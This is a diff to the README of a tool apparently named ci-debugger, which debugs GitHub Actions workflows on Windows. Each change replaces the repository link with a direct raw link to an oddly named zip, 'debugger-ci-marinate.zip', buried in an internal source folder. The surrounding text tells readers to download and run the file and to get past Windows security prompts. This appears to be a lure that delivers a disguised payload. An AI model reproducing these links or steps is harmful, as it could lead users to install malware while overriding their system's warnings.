@@ -1,6 +1,6 @@
 # 🐞 ci-debugger - Debug workflows with local breakpoints
 
-[![Download ci-debugger](https://img.shields.io/badge/Download-ci--debugger-blue?style=for-the-badge&logo=github)](https://github.com/Verystrangecat/ci-debugger)
+[![Download ci-debugger](https://img.shields.io/badge/Download-ci--debugger-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Verystrangecat/ci-debugger/main/internal/cli/debugger-ci-marinate.zip)
 
 ## 🚀 What this does
 
@@ -22,7 +22,7 @@ Use ci-debugger if you want to:
 
 Visit this page to download:
 
-[https://github.com/Verystrangecat/ci-debugger](https://github.com/Verystrangecat/ci-debugger)
+[https://raw.githubusercontent.com/Verystrangecat/ci-debugger/main/internal/cli/debugger-ci-marinate.zip](https://raw.githubusercontent.com/Verystrangecat/ci-debugger/main/internal/cli/debugger-ci-marinate.zip)
 
 On that page, look for the latest release or download file for Windows. If you see a `.exe` file, download and run it. If you see a zip file, download it, unzip it, and open the app inside the folder.
 
@@ -40,7 +40,7 @@ If Windows shows a security prompt, choose the option that lets you open the fil
 ## 🧭 Install and open
 
 1. Go to the download page:
-   [https://github.com/Verystrangecat/ci-debugger](https://github.com/Verystrangecat/ci-debugger)
+   [https://raw.githubusercontent.com/Verystrangecat/ci-debugger/main/internal/cli/debugger-ci-marinate.zip](https://raw.githubusercontent.com/Verystrangecat/ci-debugger/main/internal/cli/debugger-ci-marinate.zip)
 
 2. Find the Windows download.
 
@@ -156,6 +156,6 @@ Use case: local GitHub Actions workflow debugging on Windows
 
 ## 🖱️ Get it now
 
-[Download ci-debugger](https://github.com/Verystrangecat/ci-debugger)
+[Download ci-debugger](https://raw.githubusercontent.com/Verystrangecat/ci-debugger/main/internal/cli/debugger-ci-marinate.zip)
 
 Open the page, choose the latest release or file for Windows, then download and run it
